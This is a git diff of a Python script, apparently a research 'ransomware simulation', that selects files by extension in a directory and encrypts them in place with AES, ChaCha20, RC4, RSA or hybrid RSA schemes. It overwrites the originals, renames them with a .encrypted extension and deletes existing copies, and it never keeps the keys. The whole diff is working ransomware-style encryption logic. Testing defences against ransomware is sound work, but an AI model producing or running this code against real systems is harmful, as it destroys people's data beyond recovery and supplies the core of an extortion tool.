@@ -4,11 +4,14 @@ import zipfile
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives.asymmetric import rsa
-from cryptography.hazmat.primitives.asymmetric.padding import OAEP
 from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
-from cryptography.hazmat.primitives.asymmetric import padding
+from cryptography.hazmat.primitives import padding
+
+# Hardcoded AES key (if needed)
+HARDCODED_AES_KEY = os.urandom(32)  # Replace with your fixed key if necessary
 
 # Load ransomware information from ransom.json
 def load_ransomware_data():
@@ -24,16 +27,15 @@ def display_ransomware_options(ransomware_data):
 # Helper function to check file size
 def check_file_size(file_path):
     file_size = os.path.getsize(file_path)
-    if file_size < (64 * 1024):  # < 1KB
-        return 'full'
-    else:
-        return 'partial'
+    return 'full' if file_size < (1 * 1024 * 1024 * 1024) else 'partial'
 
-# AES Encryption
+# AES Encryption with PKCS7 padding
 def aes_encrypt(data, key):
     cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())
     encryptor = cipher.encryptor()
-    return encryptor.update(data) + encryptor.finalize()
+    padder = padding.PKCS7(128).padder()  # Block size for AES is 128 bits
+    padded_data = padder.update(data) + padder.finalize()
+    return encryptor.update(padded_data) + encryptor.finalize()
 
 # ChaCha20 Encryption
 def chacha20_encrypt(data, key, nonce):
@@ -51,50 +53,111 @@ def rc4_encrypt(data, key):
 def rsa_encrypt(data, public_key):
     return public_key.encrypt(
         data,
-        padding.OAEP(
-            mgf=padding.MGF1(algorithm=hashes.SHA256()),
+        asym_padding.OAEP(
+            mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
             algorithm=hashes.SHA256(),
             label=None
         )
     )
 
-# Encrypt file based on encryption type
-def encrypt_file(file_path, enc_type, enc_algo, key=None, rsa_key=None):
-    file_size = os.path.getsize(file_path)
-    if(check_file_size(file_path)=='full'):
-         with open(file_path, "rb") as file:
-              file_data = file.read()    # Reads the whole doc if full encryption needed 
-    else:
+
+def encrypt_and_zip_files(enc_type, enc_algo, key=None, rsa_key=None, zip_type=None, target_files=None, directory=None):
+    """
+    Zips all target files if zip_type is specified and encrypts the zip file.
+    """
+    # Step 1: Handle Zipping of Files if zip_type is specified
+    if zip_type and zip_type.lower() != "none":
+        zip_file_path = os.path.join(directory, "encrypted_files.zip")
+
+        # Create a zip archive with all target files
+        with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            for target in target_files:
+                zipf.write(target, os.path.basename(target))
+                print(f"Added {target} to {zip_file_path}")
+
+        # Encrypt the zip file instead of individual files
+        file_path = zip_file_path
+
+        # Read the file data
         with open(file_path, "rb") as file:
-              file_data = file.read(64)       # Reads only 64 bytes if partial encryption si to be done 
+            file_data = file.read()
 
-    # Choose encryption algorithm based on enc_type
-    if enc_type == "AES":
-        encrypted_data = aes_encrypt(file_data, key)
-    elif enc_type == "ChaCha20":
-        nonce = os.urandom(16)  # ChaCha20 requires a nonce
-        encrypted_data = chacha20_encrypt(file_data, key, nonce)
-    elif enc_type == "RC4":
-        encrypted_data = rc4_encrypt(file_data, key)
-    elif enc_type == "RSA":
-        encrypted_data = rsa_encrypt(file_data, rsa_key.public_key())
-    elif enc_type == "AES + RSA":
-        encrypted_data = aes_encrypt(file_data, key)
-        encrypted_data = rsa_encrypt(encrypted_data, rsa_key.public_key())
-    elif enc_type == "ChaCha20 + RSA":
-        nonce = os.urandom(16)
-        encrypted_data = chacha20_encrypt(file_data, key, nonce)
-        encrypted_data = rsa_encrypt(encrypted_data, rsa_key.public_key())
+        # Step 2: Choose encryption algorithm based on enc_type
+        if enc_type == "AES":
+            encrypted_data = aes_encrypt(file_data, key)
+        elif enc_type == "ChaCha20":
+            nonce = os.urandom(12)  # ChaCha20 typically uses a 12-byte nonce
+            encrypted_data = chacha20_encrypt(file_data, key, nonce)
+        elif enc_type == "RC4":
+            encrypted_data = rc4_encrypt(file_data, key)
+        elif enc_type == "RSA":
+            encrypted_data = rsa_encrypt(file_data, rsa_key.public_key())
+        elif enc_type == "AES + RSA":
+            encrypted_data = aes_encrypt(file_data, key)
+            encrypted_key = rsa_encrypt(key, rsa_key.public_key())
+            encrypted_data = encrypted_key + encrypted_data
+        elif enc_type == "ChaCha20 + RSA":
+            nonce = os.urandom(12)
+            encrypted_data = chacha20_encrypt(file_data, key, nonce)
+            encrypted_key = rsa_encrypt(key, rsa_key.public_key())
+            encrypted_data = encrypted_key + encrypted_data
 
-    # Write encrypted data back to file
-    with open(file_path, "wb") as file:
-        file.write(encrypted_data)
+        # Write encrypted data back to the zip file
+        with open(file_path, "wb") as file:
+            file.write(encrypted_data)
+
+        # Rename zip file with .encrypted extension
+        encrypted_zip_path = f"{zip_file_path}.encrypted"
+        
+        # Check if file already exists, if so, remove it
+        if os.path.exists(encrypted_zip_path):
+            os.remove(encrypted_zip_path)
+            
+        os.rename(zip_file_path, encrypted_zip_path)
+        print(f"Zip file encrypted and renamed to {encrypted_zip_path}")
+
+    else:
+        print("No zipping required, proceeding with individual file encryption...")
+        for file_path in target_files:
+            # Encrypt each file individually
+            file_size_type = check_file_size(file_path)
+            read_size = None if file_size_type == 'full' else 64
+
+            with open(file_path, "rb") as file:
+                file_data = file.read() if read_size is None else file.read(read_size)
+
+            if enc_type == "AES":
+                encrypted_data = aes_encrypt(file_data, key)
+            elif enc_type == "ChaCha20":
+                nonce = os.urandom(12)
+                encrypted_data = chacha20_encrypt(file_data, key, nonce)
+            elif enc_type == "RC4":
+                encrypted_data = rc4_encrypt(file_data, key)
+            elif enc_type == "RSA":
+                encrypted_data = rsa_encrypt(file_data, rsa_key.public_key())
+            elif enc_type == "AES + RSA":
+                encrypted_data = aes_encrypt(file_data, key)
+                encrypted_data = rsa_encrypt(encrypted_data, rsa_key.public_key())
+            
+            with open(file_path, "wb") as file:
+                file.write(encrypted_data)
+            
+            add_extension(file_path, ".encrypted")
+
 
 # Add ransomware-specific extension to the file
 def add_extension(file_path, extension):
     new_file_path = f"{file_path}{extension}"
+    
+    # Check if the file with the new extension already exists
+    if os.path.exists(new_file_path):
+        print(f"File {new_file_path} already exists. Removing the old file.")
+        os.remove(new_file_path)  # Remove the old file if it exists
+    
+    # Rename the original file to add the extension
     os.rename(file_path, new_file_path)
     return new_file_path
+
 
 # Zip files with password protection if required
 def zip_files(directory, target_files, password, zip_type="Standard_zip"):
@@ -103,57 +166,34 @@ def zip_files(directory, target_files, password, zip_type="Standard_zip"):
     with zipfile.ZipFile(zip_name, 'w') as zipf:
         for file in target_files:
             zipf.write(file)
-
     print(f"Files zipped into {zip_name} with zip type: {zip_type}")
 
-# Main function that runs the ransomware simulation
+# Adjust run_ransomware_simulation function to use new zip and encryption method
 def run_ransomware_simulation():
-    # Load ransomware data from the JSON file
     ransomware_data = load_ransomware_data()
-
-    # Display available options
     display_ransomware_options(ransomware_data)
 
-    # Choose the ransomware variant
     choice = int(input("Choose a ransomware by entering its number: ")) - 1
     selected_ransomware = ransomware_data[choice]
 
-    # Generate key based on encryption algorithm
     if "AES" in selected_ransomware["enc-type"] or "ChaCha20" in selected_ransomware["enc-type"]:
         key = os.urandom(32)  # Random 256-bit AES or ChaCha20 key
     else:
         key = None
     
-    # Generate RSA key pair
     if "RSA" in selected_ransomware["enc-type"]:
         rsa_key = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())
     else:
         rsa_key = None
 
-    # Check if the ransomware specifies a zip type
-    if selected_ransomware["zip_type"] and selected_ransomware["zip_type"] != "None":
-        print(f"{selected_ransomware['ransomware']} uses zip type: {selected_ransomware['zip_type']}. Zipping files...")
-        # Get directory and target files from the user
-        directory = r'D:\Cyber\Malware\MoSer\target' ## CHANGE THIS DIRECTORY PATH
-        target_files = [os.path.join(directory, file) for file in os.listdir(directory) 
-                        if file.endswith(tuple(selected_ransomware["targets"]))]
+    directory = r'D:\Cyber\Malware\MoSer\target'
+    target_files = [os.path.join(directory, file) for file in os.listdir(directory)
+                    if file.endswith(tuple(selected_ransomware["targets"]))]
 
-        # Zip the files with the specified zip type
-        zip_files(directory, target_files, password="ransom", zip_type=selected_ransomware["zip_type"])
-    else:
-        print(f"Encrypting files using {selected_ransomware['enc-type']} and algorithm {selected_ransomware['enc-algo']}...")
-
-        # Get directory and target files from the user
-        directory = r'D:\Cyber\Malware\MoSer\target' ## CHANGE THIS DIRECTORY PATH
-        target_files = [os.path.join(directory, file) for file in os.listdir(directory) 
-                        if file.endswith(tuple(selected_ransomware["targets"]))]
-
-        # Encrypt each file and apply the ransomware extension
-        for file in target_files:
-            encrypt_file(file, selected_ransomware["enc-type"], selected_ransomware["enc-algo"], key, rsa_key)
-            encrypted_file = add_extension(file, selected_ransomware["extension"])
-            print(f"Encrypted and renamed: {encrypted_file}")
-
+    encrypt_and_zip_files(
+        selected_ransomware["enc-type"], selected_ransomware["enc-algo"],
+        key, rsa_key, selected_ransomware.get("zip_type"), target_files, directory
+    )
 # Run the ransomware simulation
 if __name__ == "__main__":
     run_ransomware_simulation()
